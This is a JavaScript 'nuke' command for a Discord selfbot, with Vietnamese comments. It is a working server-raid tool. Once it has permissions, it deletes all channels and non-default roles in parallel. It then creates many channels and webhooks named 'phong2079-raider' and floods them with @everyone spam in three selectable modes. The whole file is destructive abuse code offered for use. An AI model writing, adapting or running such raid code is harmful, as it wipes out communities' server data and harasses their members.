export const name = 'nuke';
export const permission = 'everyone';

export async function execute(message, args, client) {
    try {
        // Kiểm tra xem có phải là server không
        if (!message.guild) {
            return '❌ Lệnh này chỉ có thể sử dụng trong server!';
        }

        // Kiểm tra quyền của selfbot
        const selfMember = message.guild.members.cache.get(client.user.id);
        if (!selfMember) {
            return '❌ Không thể lấy thông tin quyền của bot!';
        }

        // Kiểm tra các quyền cần thiết
        const requiredPermissions = [
            'MANAGE_CHANNELS',  // Quản lý kênh
            'MANAGE_ROLES',     // Quản lý vai trò
            'MANAGE_WEBHOOKS',  // Quản lý webhook
            'MANAGE_MESSAGES',  // Quản lý tin nhắn
            //'MANAGE_NICKNAMES', // Quản lý biệt danh
            //'MANAGE_EMOJIS'     // Quản lý emoji
        ];

        const missingPermissions = requiredPermissions.filter(perm => !selfMember.permissions.has(perm));

        if (missingPermissions.length > 0) {
            return `❌ Bot thiếu các quyền sau: ${missingPermissions.join(', ')}`;
        }

        // Nếu không có tham số start, chỉ kiểm tra quyền
        if (!args[0] || args[0].toLowerCase() !== 'start') {
            return `✅ Bot có đủ quyền để thực hiện nuke!`;
        }

        // Kiểm tra phương thức nuke
        const nukeMethod = args[1]?.toLowerCase();
        if (!nukeMethod || !['webhook', 'message', 'best'].includes(nukeMethod)) {
            return '❌ Vui lòng chọn phương thức nuke: `;nuke start webhook`, `;nuke start message` hoặc `;nuke start best`';
        }

        // Lấy thông tin số lượng danh mục và kênh
        const numberOfCategories = parseInt(args[2]) || 5;
        const channelsPerCategory = parseInt(args[3]) || 3;
        const customText = args.slice(4).join(' ') || '@everyone';

        console.log(`📝 Thông tin nuke:`);
        console.log(`- Phương thức: ${nukeMethod}`);
        console.log(`- Số danh mục: ${numberOfCategories}`);
        console.log(`- Số kênh mỗi danh mục: ${channelsPerCategory}`);
        console.log(`- Text spam: ${customText}`);

        // Bắt đầu quá trình nuke
        console.log('🚀 Bắt đầu quá trình nuke...');

        // Xóa tất cả các kênh
        const channels = message.guild.channels.cache;
        console.log(`📊 Tổng số kênh cần xóa: ${channels.size}`);
        
        // Xóa tất cả kênh song song
        await Promise.all(channels.map(async channel => {
            try {
                console.log(`🗑️ Đang xóa kênh: ${channel.name} (ID: ${channel.id})`);
                await channel.delete();
                console.log(`✅ Đã xóa kênh: ${channel.name} (ID: ${channel.id})`);
            } catch (error) {
                console.error(`❌ Không thể xóa kênh ${channel.name} (ID: ${channel.id}):`, error.message);
            }
        }));

        // Xóa tất cả các vai trò
        const roles = message.guild.roles.cache;
        console.log(`📊 Tổng số vai trò cần xóa: ${roles.size - 1}`); // Trừ vai trò @everyone
        
        // Xóa tất cả vai trò song song
        await Promise.all(roles.map(async role => {
            try {
                if (role.id !== message.guild.id) { // Không xóa vai trò @everyone
                    console.log(`🗑️ Đang xóa vai trò: ${role.name} (ID: ${role.id})`);
                    await role.delete();
                    console.log(`✅ Đã xóa vai trò: ${role.name} (ID: ${role.id})`);
                }
            } catch (error) {
                console.error(`❌ Không thể xóa vai trò ${role.name} (ID: ${role.id}):`, error.message);
            }
        }));

        // Tạo danh mục ngẫu nhiên
        console.log(`📁 Đang tạo ${numberOfCategories} danh mục...`);
        const categoryPromises = Array(numberOfCategories).fill().map(async (_, i) => {
            const categoryNumber = i + 1;
            return message.guild.channels.create(`PHONG2079-${categoryNumber}`, {
                type: 'GUILD_CATEGORY',
                position: i
            });
        });

        const createdCategories = await Promise.all(categoryPromises);
        console.log(`✅ Đã tạo xong ${numberOfCategories} danh mục`);

        // Tạo kênh cho mỗi danh mục
        console.log(`📝 Đang tạo ${channelsPerCategory} kênh cho mỗi danh mục...`);
        const allChannels = [];
        
        for (const category of createdCategories) {
            const channelPromises = Array(channelsPerCategory).fill().map(async (_, i) => {
                const channelNumber = i + 1;
                return message.guild.channels.create(`phong2079-here-${channelNumber}`, {
                    type: 'GUILD_TEXT',
                    parent: category.id
                });
            });

            const categoryChannels = await Promise.all(channelPromises);
            allChannels.push(...categoryChannels);
        }

        console.log(`✅ Đã tạo xong ${allChannels.length} kênh trong ${createdCategories.length} danh mục`);

        if (nukeMethod === 'webhook') {
            // Tạo webhook cho tất cả kênh trước
            const webhooks = [];
            for (const channel of allChannels) {
                try {
                    console.log(`🔗 Đang tạo webhook phong2079-raider cho kênh ${channel.name}...`);
                    const webhook = await channel.createWebhook('phong2079-raider', {
                        avatar: client.user.displayAvatarURL()
                    });
                    console.log(`✅ Đã tạo webhook: ${webhook.name}`);
                    webhooks.push(webhook);
                } catch (error) {
                    console.error(`❌ Lỗi khi tạo webhook cho kênh ${channel.name}:`, error.message);
                }
            }

            // Spam ngẫu nhiên giữa các kênh
            console.log('💬 Bắt đầu spam ngẫu nhiên giữa các kênh...');
            const totalSpams = webhooks.length * 5; // 5 lần cho mỗi kênh
            const spamPromises = Array(totalSpams).fill().map(async () => {
                const randomWebhook = webhooks[Math.floor(Math.random() * webhooks.length)];
                try {
                    await randomWebhook.send(customText);
                } catch (error) {
                    console.error(`❌ Lỗi khi spam với webhook ${randomWebhook.name}:`, error.message);
                }
            });

            // Chạy tất cả spam cùng lúc
            await Promise.all(spamPromises);
        } else if (nukeMethod === 'message') {
            // Spam ngẫu nhiên giữa các kênh
            console.log('💬 Bắt đầu spam ngẫu nhiên giữa các kênh...');
            const totalSpams = allChannels.length * 5; // 5 lần cho mỗi kênh
            const spamPromises = Array(totalSpams).fill().map(async () => {
                const randomChannel = allChannels[Math.floor(Math.random() * allChannels.length)];
                try {
                    await randomChannel.send(customText);
                } catch (error) {
                    console.error(`❌ Lỗi khi spam trong kênh ${randomChannel.name}:`, error.message);
                }
            });

            // Chạy tất cả spam cùng lúc
            await Promise.all(spamPromises);
        } else if (nukeMethod === 'best') {
            // Tạo webhook và spam message song song
            console.log('💬 Bắt đầu spam kết hợp webhook và message...');

            // Tạo webhook cho tất cả kênh (chạy song song với spam message)
            const webhookPromises = allChannels.map(async channel => {
                try {
                    console.log(`🔗 Đang tạo webhook phong2079-raider cho kênh ${channel.name}...`);
                    const webhook = await channel.createWebhook('phong2079-raider', {
                        avatar: client.user.displayAvatarURL()
                    });
                    console.log(`✅ Đã tạo webhook: ${webhook.name}`);
                    return webhook;
                } catch (error) {
                    console.error(`❌ Lỗi khi tạo webhook cho kênh ${channel.name}:`, error.message);
                    return null;
                }
            });

            // Spam message ngay lập tức không đợi webhook
            const messageSpamPromises = Array(allChannels.length * 5).fill().map(async () => {
                const randomChannel = allChannels[Math.floor(Math.random() * allChannels.length)];
                try {
                    await randomChannel.send(customText);
                } catch (error) {
                    console.error(`❌ Lỗi khi spam trong kênh ${randomChannel.name}:`, error.message);
                }
            });

            // Chạy spam message ngay lập tức
            await Promise.all(messageSpamPromises);

            // Sau khi spam message xong, kiểm tra webhook đã tạo xong chưa
            const webhooks = (await Promise.all(webhookPromises)).filter(webhook => webhook !== null);

            // Nếu có webhook đã tạo xong, spam thêm bằng webhook
            if (webhooks.length > 0) {
                console.log('💬 Bắt đầu spam bằng webhook...');
                const webhookSpamPromises = Array(webhooks.length * 5).fill().map(async () => {
                    const randomWebhook = webhooks[Math.floor(Math.random() * webhooks.length)];
                    try {
                        await randomWebhook.send(customText);
                    } catch (error) {
                        console.error(`❌ Lỗi khi spam với webhook ${randomWebhook.name}:`, error.message);
                    }
                });

                // Chạy spam webhook
                await Promise.all(webhookSpamPromises);
            }
        }

        console.log('✅ Đã hoàn thành quá trình nuke!');
        return '✅ Đã hoàn thành quá trình nuke!';
    } catch (error) {
        console.error('❌ Lỗi khi thực hiện nuke:', error);
        return '❌ Đã xảy ra lỗi khi thực hiện nuke!';
    }
} 